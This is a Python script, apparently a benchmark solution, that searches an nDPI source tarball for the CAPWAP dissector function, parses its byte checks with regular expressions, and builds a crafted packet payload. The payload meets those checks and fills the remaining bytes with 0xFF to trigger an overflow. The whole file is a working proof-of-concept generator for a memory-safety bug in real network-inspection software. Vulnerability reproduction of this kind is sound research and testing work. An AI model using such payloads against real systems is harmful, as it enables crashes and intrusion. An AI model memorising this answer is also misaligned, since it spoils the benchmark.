import tarfile
import re
from collections import defaultdict


class Solution:
    def solve(self, src_path: str) -> bytes:
        func_name = "ndpi_search_setup_capwap"
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            # Fallback: simple high-entropy payload
            return b"\xff" * 33

        func_body = None

        for member in tf.getmembers():
            if not member.isfile():
                continue
            name = member.name
            if not (name.endswith(".c") or name.endswith(".h")):
                continue
            try:
                f = tf.extractfile(member)
                if f is None:
                    continue
                data = f.read().decode("utf-8", errors="ignore")
            except Exception:
                continue

            if func_name in data:
                body = self._extract_function_body(data, func_name)
                if body:
                    func_body = body
                    break

        if not func_body:
            # If we fail to find/parse the function, return a generic payload
            return b"\xff" * 33

        try:
            poc = self._generate_poc_from_body(func_body)
        except Exception:
            # Robust fallback on any unexpected analysis error
            poc = b"\xff" * 33
        return poc

    def _extract_function_body(self, text: str, func_name: str) -> str:
        """
        Extract the body (from first '{' to matching '}') of the given function.
        """
        pattern = re.compile(
            r'%s\s*\([^;{]*\)\s*\{' % re.escape(func_name),
            re.MULTILINE | re.DOTALL,
        )
        m = pattern.search(text)
        if not m:
            return None
        start = text.find("{", m.start())
        if start == -1:
            return None

        depth = 0
        for i in range(start, len(text)):
            c = text[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    end = i + 1
                    return text[start:end]
        return None

    def _generate_poc_from_body(self, body: str) -> bytes:
        """
        Analyze the function body heuristically and generate a payload that:
        - Satisfies simple header checks on payload bytes
        - Has large values in unconstrained bytes to increase overflow likelihood
        """
        # Identify buffer variable names that refer to packet payload
        buf_vars = ["packet->payload"]

        alias_pattern = re.compile(
            r'([A-Za-z_]\w*)\s*=\s*[^;]*packet->payload[^;]*;'
        )
        for name in alias_pattern.findall(body):
            if name not in buf_vars:
                buf_vars.append(name)

        # Build regex for any of the buffer variables
        var_pattern = "(?:" + "|".join(re.escape(v) for v in buf_vars) + ")"

        constraints = defaultdict(list)  # index -> list of (mask, op, value)
        max_idx = -1

        def parse_int_lit(s):
            if isinstance(s, int):
                return s
            s = s.strip()
            try:
                if s.lower().startswith("0x"):
                    return int(s, 16)
                return int(s, 10)
            except Exception:
                return 0

        def add_constraint(idx_str, mask_lit, op, val_lit):
            nonlocal max_idx
            try:
                idx = int(idx_str)
            except Exception:
                return
            mask = parse_int_lit(mask_lit) & 0xFF
            val = parse_int_lit(val_lit) & 0xFF
            constraints[idx].append((mask, op, val))
            if idx > max_idx:
                max_idx = idx

        # Simple comparisons: buf[idx] == value or != value
        simple_pattern = re.compile(
            rf'({var_pattern})\s*\[\s*(\d+)\s*\]\s*([=!]=)\s*'
            r'(0x[0-9A-Fa-f]+|\d+)'
        )
        for m in simple_pattern.finditer(body):
            idx = m.group(2)
            op = m.group(3)
            val = m.group(4)
            add_constraint(idx, 0xFF, op, val)

        # Reversed: value == buf[idx]
        simple_rev_pattern = re.compile(
            rf'(0x[0-9A-Fa-f]+|\d+)\s*([=!]=)\s*({var_pattern})\s*\[\s*(\d+)\s*\]'
        )
        for m in simple_rev_pattern.finditer(body):
            val = m.group(1)
            op = m.group(2)
            idx = m.group(4)
            add_constraint(idx, 0xFF, op, val)

        # Masked comparisons: buf[idx] & mask == value
        mask_pattern1 = re.compile(
            rf'({var_pattern})\s*\[\s*(\d+)\s*\]\s*&\s*'
            r'(0x[0-9A-Fa-f]+|\d+)\s*([=!]=)\s*'
            r'(0x[0-9A-Fa-f]+|\d+)'
        )
        for m in mask_pattern1.finditer(body):
            idx = m.group(2)
            mask = m.group(3)
            op = m.group(4)
            val = m.group(5)
            add_constraint(idx, mask, op, val)

        # Masked comparisons: mask & buf[idx] == value
        mask_pattern2 = re.compile(
            rf'(0x[0-9A-Fa-f]+|\d+)\s*&\s*({var_pattern})\s*\[\s*(\d+)\s*\]\s*'
            r'([=!]=)\s*(0x[0-9A-Fa-f]+|\d+)'
        )
        for m in mask_pattern2.finditer(body):
            mask = m.group(1)
            idx = m.group(3)
            op = m.group(4)
            val = m.group(5)
            add_constraint(idx, mask, op, val)

        # Heuristic: minimal length requirements on packet->payload_packet_len
        min_required_len = 0
        lt_pattern = re.compile(r'payload_packet_len\s*<\s*(\d+)')
        le_pattern = re.compile(r'payload_packet_len\s*<=\s*(\d+)')

        for m in lt_pattern.finditer(body):
            try:
                val = int(m.group(1))
                if val > min_required_len:
                    min_required_len = val
            except Exception:
                pass

        for m in le_pattern.finditer(body):
            try:
                val = int(m.group(1)) + 1
                if val > min_required_len:
                    min_required_len = val
            except Exception:
                pass

        # Determine payload length:
        # - at least ground-truth length guess (33)
        # - at least highest constrained index + 1
        # - at least min_required_len
        base_len = 33
        if max_idx >= 0:
            base_len = max(base_len, max_idx + 1)
        if min_required_len > 0:
            base_len = max(base_len, min_required_len)

        # Upper-bound length to avoid huge allocations in harness (safety)
        if base_len > 4096:
            base_len = 4096
        if base_len <= 0:
            base_len = 33

        length = base_len

        # Build payload honoring constraints and biasing to large values
        payload = [0] * length

        for i in range(length):
            cons = constraints.get(i)
            if not cons:
                # No constraint: set to 0xFF to maximize effect on length fields
                payload[i] = 0xFF
                continue

            chosen = None
            # Prefer large values; iterate from 0xFF downward
            for b in range(0xFF, -1, -1):
                ok = True
                for mask, op, val in cons:
                    masked = b & mask
                    if op == "==" and masked != val:
                        ok = False
                        break
                    if op == "!=" and masked == val:
                        ok = False
                        break
                if ok:
                    chosen = b
                    break

            if chosen is None:
                # Fallback: try to satisfy first constraint as best as possible
                mask, op, val = cons[0]
                if op == "==":
                    # Choose a value consistent with val under mask
                    b = (val & mask) | (~mask & 0xFF)
                else:
                    # For '!=' pick something different
                    b = (val + 1) & 0xFF
                payload[i] = b & 0xFF
            else:
                payload[i] = chosen & 0xFF

        return bytes(payload)